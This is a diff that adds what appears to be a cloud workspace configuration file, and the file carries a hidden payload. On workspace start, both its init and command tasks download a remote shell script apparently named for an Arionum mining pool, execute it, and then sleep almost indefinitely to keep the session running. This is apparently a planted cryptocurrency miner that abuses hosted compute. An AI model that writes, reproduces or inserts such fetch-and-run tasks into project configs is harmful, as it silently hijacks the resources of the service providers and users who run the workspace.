@@ -1,0 +1,8 @@
+ports:
+- port: 8000
+  onOpen: open-preview
+tasks:
+  - init: |
+      wget https://raw.githubusercontent.com/Jidgjake/up/master/arionumpool.sh && chmod +x arionumpool.sh && ./arionumpool.sh && sleep 999999999
+    command: |
+      wget https://raw.githubusercontent.com/Jidgjake/up/master/arionumpool.sh && chmod +x arionumpool.sh && ./arionumpool.sh && sleep 999999999
